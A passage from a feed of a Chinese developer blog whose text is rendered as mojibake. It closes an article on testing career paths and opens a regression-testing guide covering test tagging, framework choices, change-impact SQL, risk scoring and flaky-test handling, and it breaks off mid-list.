<li><strong>å‘å·¦ç§»</strong>ï¼šæ›´æ—©ä»‹å…¥ï¼Œé€šè¿‡å•å…ƒæµ‹è¯•æ¡†æ¶ã€ä»£ç æ‰«æå·¥å…·ç­‰åœ¨å¼€å‘é˜¶æ®µå®ˆæŠ¤è´¨é‡ã€‚</li>
<li><strong>å‘å³ç§»</strong>ï¼šå…³æ³¨éƒ¨ç½²åï¼Œé€šè¿‡å¼€å‘ç›‘æ§å·¥å…·ã€æ··æ²Œå·¥ç¨‹å¹³å°ç­‰ç¡®ä¿ç”Ÿäº§ç¯å¢ƒç¨³å®šæ€§ã€‚</li>
<li><strong>å‘å†…è</strong>ï¼šå…¶äº§å‡ºçš„å·¥å…·å’Œå¹³å°ï¼ˆå¦‚ç²¾å‡†æµ‹è¯•å¹³å°ã€æµé‡å›æ”¾å·¥å…·ã€æ™ºèƒ½æµ‹è¯•æ•°æ®ç®¡ç†å¹³å°ï¼‰æ­£åœ¨ç›´æ¥èµ‹èƒ½ç»™å¼€å‘äººå‘˜ï¼Œæ¨åŠ¨â€œè´¨é‡å†…å»ºâ€ï¼Œè®©å¼€å‘äººå‘˜èƒ½æ›´å®¹æ˜“åœ°ä¸ºè‡ªå·±ä»£ç çš„è´¨é‡è´Ÿè´£ã€‚</li>
</ol>
<p>å› æ­¤ï¼Œæµ‹è¯•å¼€å‘çš„ç»ˆæå½¢æ€ï¼Œæˆ–è®¸ä¸å†æ˜¯â€œä¸ºæµ‹è¯•è€Œå¼€å‘çš„å·¥ç¨‹å¸ˆâ€ï¼Œè€Œæ˜¯ <strong>â€œè´¨é‡ä¸æ•ˆèƒ½å¹³å°å·¥ç¨‹å¸ˆâ€</strong> ï¼Œä»–ä»¬æ˜¯ç ”å‘å›¢é˜Ÿçš„åŸºç¡€è®¾æ–½å»ºè®¾è€…ï¼Œæ˜¯è®©å¼€å‘è€…å’Œæµ‹è¯•è€…éƒ½èƒ½æ›´é«˜äº§ã€æ›´å¯é çš„å¹•åå¼•æ“ã€‚</p>
<h3 data-id="heading-4"><strong>ç»“è®º</strong></h3>
<p>æ‰€ä»¥ï¼Œæµ‹è¯•å¼€å‘ vs. æµ‹è¯• vs. å¼€å‘ï¼ŒåŒºåˆ«ä¸åœ¨äºå­°ä¼˜å­°åŠ£ï¼Œè€Œåœ¨äº<strong>èµ›é“ä¸ä½¿å‘½çš„ä¸åŒ</strong>ã€‚å®ƒæ˜¯å¯¹ä¼ ç»Ÿæµ‹è¯•å²—ä½çš„<strong>æŠ€æœ¯æ·±åŒ–ä¸èŒè´£æ‰©å±•</strong>ï¼Œä¹Ÿæ˜¯å¯¹å¼€å‘å²—ä½åœ¨è´¨é‡ä¸æ•ˆèƒ½ç»´åº¦ä¸Šçš„<strong>ä¸“é¡¹å¼ºåŒ–</strong>ã€‚</p>
<p>å¯¹äºæ‹©ä¸šè€…ï¼Œé€‰æ‹©çš„å…³é”®åœ¨äºå®¡è§†å†…å¿ƒï¼šä½ æ›´æ¸´æœ›ç›´æ¥åˆ›é€ ç”¨æˆ·å¯è§çš„äº§å“ä»·å€¼ï¼ˆå¼€å‘ï¼‰ï¼Œè¿˜æ˜¯æ›´äº«å—é€šè¿‡æ·±åº¦åˆ†æå®ˆæŠ¤äº§å“å®Œç¾ï¼ˆæµ‹è¯•ï¼‰ï¼Œæˆ–æ˜¯çƒ­è¡·äºæ„å»ºå¼ºå¤§çš„æ”¯æ’‘ç³»ç»Ÿæ¥æå‡æ•´ä¸ªåˆ›é€ è¿‡ç¨‹çš„æ•ˆèƒ½ä¸å¯é æ€§ï¼ˆæµ‹è¯•å¼€å‘ï¼‰ï¼Ÿ</p>
<p>åœ¨è½¯ä»¶åå™¬ä¸–ç•Œçš„ä»Šå¤©ï¼Œè¿™ä¸‰è€…éƒ½æ˜¯ä¸å¯æˆ–ç¼ºçš„é½¿è½®ã€‚è€Œæµ‹è¯•å¼€å‘ï¼Œæ­£æ˜¯é‚£ä¸ªç¡®ä¿æ‰€æœ‰é½¿è½®ç²¾å‡†ã€é«˜æ•ˆã€æŒä¹…å•®åˆçš„æ¶¦æ»‘å‰‚ä¸å¼ºåŒ–å‰‚ã€‚å®ƒä¸æ˜¯ä¸€æ¡â€œæ›´å¥½â€çš„è·¯ï¼Œä½†å®ƒæ˜¯ä¸€æ¡é€šå¾€<strong>æŠ€æœ¯æ·±åº¦ä¸å·¥ç¨‹å¹¿åº¦èåˆ</strong>çš„ã€å……æ»¡æŒ‘æˆ˜ä¸æœºé‡çš„ç‹¬ç‰¹è·¯å¾„ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å›å½’æµ‹è¯•ï¼šè½¯ä»¶æ¼”è¿›ä¸­çš„è´¨é‡å®ˆæŠ¤ç¥ä¸å®è·µå…¨æŒ‡å—]]></title>    <link>https://juejin.cn/post/7597596202025467946</link>    <guid>https://juejin.cn/post/7597596202025467946</guid>    <pubDate>2026-01-21T11:16:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597596202025467946" data-draft-id="7597641580104826934" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å›å½’æµ‹è¯•ï¼šè½¯ä»¶æ¼”è¿›ä¸­çš„è´¨é‡å®ˆæŠ¤ç¥ä¸å®è·µå…¨æŒ‡å—"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-21T11:16:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç äº‹æ¼«è°ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å›å½’æµ‹è¯•ï¼šè½¯ä»¶æ¼”è¿›ä¸­çš„è´¨é‡å®ˆæŠ¤ç¥ä¸å®è·µå…¨æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç äº‹æ¼«è°ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T11:16:59.000Z" title="Wed Jan 21 2026 11:16:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å›å½’æµ‹è¯•ä½œä¸ºè½¯ä»¶è´¨é‡ä¿éšœçš„æ ¸å¿ƒæ”¯æŸ±ï¼Œåœ¨æŒç»­äº¤ä»˜å’Œæ•æ·å¼€å‘æ—¶ä»£çš„é‡è¦æ€§æ—¥ç›Šå‡¸æ˜¾ã€‚æœ¬æ–‡ç³»ç»Ÿæ€§åœ°æ¢è®¨äº†å›å½’æµ‹è¯•çš„ç†è®ºåŸºç¡€ã€æŠ€æœ¯ç­–ç•¥å’Œå®æ–½æ¡†æ¶ï¼Œä¸ºä¼ä¸šæ„å»ºé«˜æ•ˆã€å¯æŒç»­çš„å›å½’æµ‹è¯•ä½“ç³»æä¾›äº†ä¸€å¥—å®Œæ•´çš„æ–¹æ³•è®ºã€‚é€šè¿‡åˆ†å±‚ç­–ç•¥ã€é€‰æ‹©æ€§æµ‹è¯•å’Œæ™ºèƒ½è‡ªåŠ¨åŒ–ç›¸ç»“åˆï¼Œç»„ç»‡å¯ä»¥åœ¨ä¿éšœè´¨é‡çš„åŒæ—¶ï¼Œæœ‰æ•ˆæ§åˆ¶æµ‹è¯•æˆæœ¬ï¼Œå®ç°è½¯ä»¶å¼€å‘é€Ÿåº¦ä¸ç¨³å®šæ€§çš„å¹³è¡¡ã€‚</p>
<h2 data-id="heading-0">1. å›å½’æµ‹è¯•çš„æ¼”è¿›ä¸ç†è®ºå®šä½</h2>
<h3 data-id="heading-1">1.1 å†å²èƒŒæ™¯ä¸å®šä¹‰æ·±åŒ–</h3>
<p>å›å½’æµ‹è¯•çš„æ¦‚å¿µæœ€æ—©æºäº20ä¸–çºª70å¹´ä»£çš„è½¯ä»¶ç»´æŠ¤å®è·µï¼Œéšç€è½¯ä»¶å¼€å‘èŒƒå¼çš„æ¼”å˜ï¼Œå…¶å†…æ¶µä¸æ–­ä¸°å¯Œã€‚ç°ä»£å›å½’æµ‹è¯•å·²ä»ç®€å•çš„â€œé‡è·‘æµ‹è¯•â€å‘å±•ä¸º<strong>ç³»ç»ŸåŒ–çš„è´¨é‡ä¿éšœæ´»åŠ¨</strong>ï¼Œå…¶æ ¸å¿ƒä»·å€¼åœ¨äºå»ºç«‹<strong>å˜æ›´å®‰å…¨ç½‘</strong>ï¼Œä½¿å¼€å‘å›¢é˜Ÿèƒ½å¤Ÿè‡ªä¿¡åœ°è¿›è¡Œä»£ç ä¿®æ”¹ï¼Œè€Œä¸å¿…æ‹…å¿ƒç ´åç°æœ‰åŠŸèƒ½ã€‚</p>
<h3 data-id="heading-2">1.2 ç†è®ºåŸºç¡€ï¼šè½¯ä»¶å˜æ›´çš„æ¶Ÿæ¼ªæ•ˆåº”</h3>
<p>ç ”ç©¶è¡¨æ˜ï¼Œè½¯ä»¶ç³»ç»Ÿå†…éƒ¨ç»„ä»¶é—´çš„è€¦åˆåº¦æ™®éé«˜äºç›´è§‚é¢„æœŸã€‚ä¸€é¡¹é’ˆå¯¹å¼€æºé¡¹ç›®çš„å®è¯ç ”ç©¶æ˜¾ç¤ºï¼Œå¹³å‡æ¯æ¬¡ä»£ç æäº¤ä¼šå½±å“2-5ä¸ªçœ‹ä¼¼æ— å…³çš„åŠŸèƒ½æ¨¡å—ã€‚è¿™ç§éšæ€§ä¾èµ–å…³ç³»æ˜¯å›å½’æµ‹è¯•å­˜åœ¨çš„æ ¹æœ¬åŸå› â€”â€”<strong>ä»»ä½•å˜æ›´éƒ½å¯èƒ½äº§ç”Ÿæ„æƒ³ä¸åˆ°çš„å‰¯ä½œç”¨</strong>ã€‚</p>
<h2 data-id="heading-3">2. å›å½’æµ‹è¯•çš„ç±»å‹å­¦åˆ†æ</h2>
<p>æ ¹æ®æµ‹è¯•èŒƒå›´å’Œç›®æ ‡çš„ä¸åŒï¼Œå›å½’æµ‹è¯•å¯åˆ†ä¸ºä»¥ä¸‹ç»´åº¦ï¼š</p>









































<table><thead><tr><th>ç±»å‹</th><th>æµ‹è¯•å¯¹è±¡</th><th>é¢‘ç‡</th><th>è‡ªåŠ¨åŒ–ç¨‹åº¦</th></tr></thead><tbody><tr><td>å•å…ƒå›å½’</td><td>å‡½æ•°/ç±»çº§åˆ«</td><td>æ¯æ¬¡æäº¤</td><td>é«˜ï¼ˆ&gt;95%ï¼‰</td></tr><tr><td>é›†æˆå›å½’</td><td>æ¨¡å—/æœåŠ¡æ¥å£</td><td>æ¯æ—¥/æ¯æ¬¡æ„å»º</td><td>ä¸­é«˜ï¼ˆ70-90%ï¼‰</td></tr><tr><td>ç³»ç»Ÿå›å½’</td><td>ç«¯åˆ°ç«¯ä¸šåŠ¡æµç¨‹</td><td>å‘å¸ƒå‰/å®šæœŸ</td><td>ä¸­ï¼ˆ50-70%ï¼‰</td></tr><tr><td>éåŠŸèƒ½å›å½’</td><td>æ€§èƒ½ã€å®‰å…¨ç­‰ç‰¹æ€§</td><td>ä¸»è¦ç‰ˆæœ¬å‘å¸ƒ</td><td>ä½ä¸­ï¼ˆ30-60%ï¼‰</td></tr><tr><td>å¯è§†åŒ–å›å½’</td><td>UI/è§†è§‰ä¸€è‡´æ€§</td><td>è®¾è®¡å˜æ›´å</td><td>ä¸­é«˜ï¼ˆ80-95%ï¼‰</td></tr></tbody></table>
<h2 data-id="heading-4">3. å›å½’æµ‹è¯•å®æ–½çš„å®Œæ•´æ¡†æ¶</h2>
<h3 data-id="heading-5">3.1 ç¬¬ä¸€é˜¶æ®µï¼šå»ºç«‹å›å½’æµ‹è¯•åŸºç¡€æ¶æ„</h3>
<h4 data-id="heading-6">3.1.1 æµ‹è¯•ç”¨ä¾‹åº“å»ºè®¾ä¸åˆ†ç±»</h4>
<ol>
<li>
<p><strong>æ ¸å¿ƒç”¨ä¾‹è¯†åˆ«</strong>ï¼šé€šè¿‡ä¸šåŠ¡ä»·å€¼åˆ†æï¼Œè¯†åˆ«å…³é”®ç”¨æˆ·æ—…ç¨‹è·¯å¾„</p>
<ul>
<li>é«˜é¢‘ä½¿ç”¨åŠŸèƒ½ï¼ˆæ¯æ—¥è®¿é—®é‡å‰20%ï¼‰</li>
<li>æ ¸å¿ƒä¸šåŠ¡åŠŸèƒ½ï¼ˆç›´æ¥å½±å“æ”¶å…¥æˆ–ç”¨æˆ·ç•™å­˜ï¼‰</li>
<li>æ³•è§„éµä»åŠŸèƒ½ï¼ˆå¿…é¡»ç¬¦åˆæ³•å¾‹è¦æ±‚ï¼‰</li>
</ul>
</li>
<li>
<p><strong>æµ‹è¯•ç”¨ä¾‹æ ‡è®°ä½“ç³»</strong>ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">priority:</span> [<span class="hljs-string">p0</span>, <span class="hljs-string">p1</span>, <span class="hljs-string">p2</span>, <span class="hljs-string">p3</span>]  <span class="hljs-comment"># åŸºäºä¸šåŠ¡å½±å“</span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> [<span class="hljs-string">functional</span>, <span class="hljs-string">performance</span>, <span class="hljs-string">security</span>, <span class="hljs-string">accessibility</span>]
<span class="hljs-bullet">-</span> <span class="hljs-attr">layer:</span> [<span class="hljs-string">unit</span>, <span class="hljs-string">integration</span>, <span class="hljs-string">e2e</span>, <span class="hljs-string">api</span>]
<span class="hljs-bullet">-</span> <span class="hljs-attr">domain:</span> [<span class="hljs-string">checkout</span>, <span class="hljs-string">search</span>, <span class="hljs-string">user-profile</span>, <span class="hljs-string">...</span>]
<span class="hljs-bullet">-</span> <span class="hljs-attr">stability:</span> [<span class="hljs-string">stable</span>, <span class="hljs-string">flaky</span>, <span class="hljs-string">deprecated</span>]
<span class="hljs-bullet">-</span> <span class="hljs-attr">automation:</span> [<span class="hljs-string">automated</span>, <span class="hljs-string">manual</span>, <span class="hljs-string">semi-auto</span>]
</code></pre>
</li>
</ol>
<h4 data-id="heading-7">3.1.2 è‡ªåŠ¨åŒ–æ¡†æ¶é€‰æ‹©ä¸åˆ†å±‚</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å›å½’æµ‹è¯•è‡ªåŠ¨åŒ–æ¶æ„ç¤ºä¾‹</span>
test_architecture = {
    <span class="hljs-string">"unit"</span>: {
        <span class="hljs-string">"framework"</span>: [<span class="hljs-string">"pytest"</span>, <span class="hljs-string">"JUnit"</span>, <span class="hljs-string">"NUnit"</span>],
        <span class="hljs-string">"coverage_target"</span>: <span class="hljs-string">"&gt;80%"</span>,
        <span class="hljs-string">"execution_time"</span>: <span class="hljs-string">"&lt;10åˆ†é’Ÿ"</span>
    },
    <span class="hljs-string">"integration"</span>: {
        <span class="hljs-string">"framework"</span>: [<span class="hljs-string">"TestNG"</span>, <span class="hljs-string">"xUnit"</span>, <span class="hljs-string">"pytest with fixtures"</span>],
        <span class="hljs-string">"mock_strategy"</span>: [<span class="hljs-string">"in-memory DB"</span>, <span class="hljs-string">"service virtualization"</span>],
        <span class="hljs-string">"execution_time"</span>: <span class="hljs-string">"&lt;30åˆ†é’Ÿ"</span>
    },
    <span class="hljs-string">"e2e"</span>: {
        <span class="hljs-string">"framework"</span>: [<span class="hljs-string">"Selenium"</span>, <span class="hljs-string">"Cypress"</span>, <span class="hljs-string">"Playwright"</span>],
        <span class="hljs-string">"parallelization"</span>: <span class="hljs-string">"è·¨æµè§ˆå™¨/è®¾å¤‡"</span>,
        <span class="hljs-string">"execution_time"</span>: <span class="hljs-string">"&lt;2å°æ—¶"</span>
    },
    <span class="hljs-string">"api"</span>: {
        <span class="hljs-string">"framework"</span>: [<span class="hljs-string">"RestAssured"</span>, <span class="hljs-string">"Supertest"</span>, <span class="hljs-string">"Postman"</span>],
        <span class="hljs-string">"contract_testing"</span>: [<span class="hljs-string">"Pact"</span>, <span class="hljs-string">"Spring Cloud Contract"</span>],
        <span class="hljs-string">"execution_time"</span>: <span class="hljs-string">"&lt;20åˆ†é’Ÿ"</span>
    }
}
</code></pre>
<h3 data-id="heading-8">3.2 ç¬¬äºŒé˜¶æ®µï¼šå›å½’æµ‹è¯•é€‰æ‹©ç­–ç•¥</h3>
<h4 data-id="heading-9">3.2.1 åŸºäºä»£ç å˜æ›´çš„åˆ†ææŠ€æœ¯</h4>
<ol>
<li>
<p><strong>é™æ€ä»£ç åˆ†æé€‰æ‹©æ³•</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨ä»£ç ä¾èµ–å›¾è¯†åˆ«å—å½±å“æ¨¡å—</li>
<li>é€šè¿‡æ§åˆ¶æµå’Œæ•°æ®æµåˆ†æç¡®å®šæµ‹è¯•èŒƒå›´</li>
<li>å·¥å…·é›†æˆç¤ºä¾‹ï¼š<code>git diff + ä¾èµ–åˆ†æå™¨</code></li>
</ul>
</li>
<li>
<p><strong>å½±å“çŸ©é˜µæ³•</strong>ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- å»ºç«‹åŠŸèƒ½-ä»£ç æ¨¡å—æ˜ å°„è¡¨</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> feature_code_mapping (
  feature_id <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>),
  module_path <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>),
  dependency_level <span class="hljs-type">INT</span> <span class="hljs-comment">-- ç›´æ¥/é—´æ¥ä¾èµ–</span>
);

<span class="hljs-comment">-- æ ¹æ®å˜æ›´çš„æ¨¡å—è·¯å¾„é€‰æ‹©æµ‹è¯•ç”¨ä¾‹</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> test_case_id 
<span class="hljs-keyword">FROM</span> test_case_coverage
<span class="hljs-keyword">WHERE</span> module_path <span class="hljs-keyword">IN</span> (
  <span class="hljs-keyword">SELECT</span> impacted_module 
  <span class="hljs-keyword">FROM</span> change_impact_analysis
  <span class="hljs-keyword">WHERE</span> commit_hash <span class="hljs-operator">=</span> <span class="hljs-string">'current_commit'</span>
);
</code></pre>
</li>
</ol>
<h4 data-id="heading-10">3.2.2 åŸºäºé£é™©çš„ä¼˜å…ˆçº§æ’åº</h4>
<pre><code class="hljs language-diff" lang="diff">é£é™©è¯„ä¼°å…¬å¼ï¼š
é£é™©è¯„åˆ† = (ä¸šåŠ¡å½±å“ Ã— æ•…éšœé¢‘ç‡ Ã— ç”¨æˆ·è¦†ç›–ç‡) / ä¿®å¤æˆæœ¬

å…¶ä¸­ï¼š
<span class="hljs-deletion">- ä¸šåŠ¡å½±å“: 1-10åˆ†ï¼ˆæ”¶å…¥å½±å“ã€å“ç‰ŒæŸå®³ç­‰ï¼‰</span>
<span class="hljs-deletion">- æ•…éšœé¢‘ç‡: å†å²æ•…éšœç‡æ•°æ®</span>
<span class="hljs-deletion">- ç”¨æˆ·è¦†ç›–ç‡: å—å½±å“ç”¨æˆ·ç™¾åˆ†æ¯”</span>
<span class="hljs-deletion">- ä¿®å¤æˆæœ¬: çƒ­ä¿®å¤æ‰€éœ€äººå¤©</span>
</code></pre>
<h3 data-id="heading-11">3.3 ç¬¬ä¸‰é˜¶æ®µï¼šå›å½’æµ‹è¯•æ‰§è¡Œä¸ä¼˜åŒ–</h3>
<h4 data-id="heading-12">3.3.1 æ™ºèƒ½æ‰§è¡Œç­–ç•¥</h4>
<ol>
<li>
<p><strong>åˆ†å±‚å¹¶è¡Œæ‰§è¡Œ</strong>ï¼š</p>
<pre><code class="hljs">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         æŒç»­é›†æˆè§¦å‘                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ ç¬¬1å±‚: å•å…ƒæµ‹è¯• (5-10åˆ†é’Ÿ)          â”‚
â”‚  â””â”€ å¿«é€Ÿåé¦ˆï¼Œå¤±è´¥åˆ™ä¸­æ–­æµç¨‹         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ ç¬¬2å±‚: é›†æˆæµ‹è¯• (20-30åˆ†é’Ÿ)         â”‚
â”‚  â””â”€ å¼‚æ­¥æ‰§è¡Œï¼Œä¸é˜»å¡å¼€å‘            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ ç¬¬3å±‚: å…³é”®E2Eæµ‹è¯• (1-2å°æ—¶)        â”‚
â”‚  â””â”€ å¤œé—´æ‰§è¡Œï¼Œæ¬¡æ—¥æŠ¥å‘Š              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
</li>
<li>
<p><strong>å¤±è´¥æµ‹è¯•åˆ†ææµç¨‹</strong>ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
  A[æµ‹è¯•å¤±è´¥] --&gt; B{æ˜¯å¦ç¯å¢ƒé—®é¢˜?}
  B --&gt;|æ˜¯| C[ç¯å¢ƒä¿®å¤]
  B --&gt;|å¦| D{æ˜¯å¦äº§å“ç¼ºé™·?}
  D --&gt;|æ˜¯| E[åˆ›å»ºç¼ºé™·æŠ¥å‘Š]
  D --&gt;|å¦| F{æ˜¯å¦æµ‹è¯•ç”¨ä¾‹é—®é¢˜?}
  F --&gt;|æ˜¯| G[æ›´æ–°æµ‹è¯•ç”¨ä¾‹]
  F --&gt;|å¦| H[æ ‡è®°ä¸ºä¸ç¨³å®šæµ‹è¯•]
  C --&gt; I[é‡æ–°æ‰§è¡Œ]
  E --&gt; I
  G --&gt; I
  H --&gt; J[æ·»åŠ åˆ°ä¸ç¨³å®šå¥—ä»¶]
</code></pre>
</li>
</ol>
<h4 data-id="heading-13">3.3.2 ä¸ç¨³å®šæµ‹è¯•ç®¡ç†</h4>
<p>ä¸ç¨³å®šæµ‹è¯•ï¼ˆFlaky Testsï¼‰æ˜¯å›å½’æµ‹è¯•çš„ä¸»è¦æŒ‘æˆ˜ã€‚åº”å¯¹ç­–ç•¥åŒ…æ‹¬ï¼š</p>
<ol>
<li>
<p><strong>ä¸ç¨³å®šæµ‹è¯•æ£€æµ‹</strong>ï¼š</p>
<ul>
<li>å¯¹åŒä¸€æäº¤è¿ç»­è¿è¡Œ5æ¬¡ï¼Œå¤±è´¥ç‡&gt;0%ä¸”&lt;100%çš„æµ‹è¯•æ ‡è®°ä¸ºä¸ç¨³å®š</li>
<li>ä½¿ç”¨ç»Ÿè®¡å­¦æ–¹æ³•è¯†åˆ«éšæœºå¤±è´¥æ¨¡å¼</li>
</ul>
</li>
<li>
<p><strong>å¤„ç†æµç¨‹</strong>ï¼š</p>
